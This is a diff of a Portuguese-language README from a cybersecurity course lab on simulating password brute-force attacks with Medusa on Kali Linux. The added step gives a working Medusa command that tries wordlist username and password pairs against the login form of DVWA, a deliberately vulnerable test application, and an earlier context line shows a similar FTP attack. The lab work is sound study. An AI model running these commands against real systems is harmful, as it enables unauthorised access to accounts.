@@ -1,3 +1,4 @@
+
 # Simulando um Ataque de Brute-Force de Senhas com Medusa e Kali Linux
 
 Passo a passo do que eu aprendi no curso de cibersegurança na DIO.
@@ -81,6 +82,15 @@ Comando: medusa -h [ip do alvo] -U smb_users.txt -P pass.txt -M ftp -t 6
 
 
 ## Passo 7 - Usando o Medusa para simular combinações de acesso.
+
+## Comando do Medusa para simular as combinações de senhas de acesso:
+medusa -h [ip do alvo] -U smb_users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
+"<img width="811" height="618" alt="12comb inacoesdeacesso" src="https://github.com/user-attachments/assets/90c10c7b-4793-4a1e-bed0-08802288a29a" />
+
 
 
 
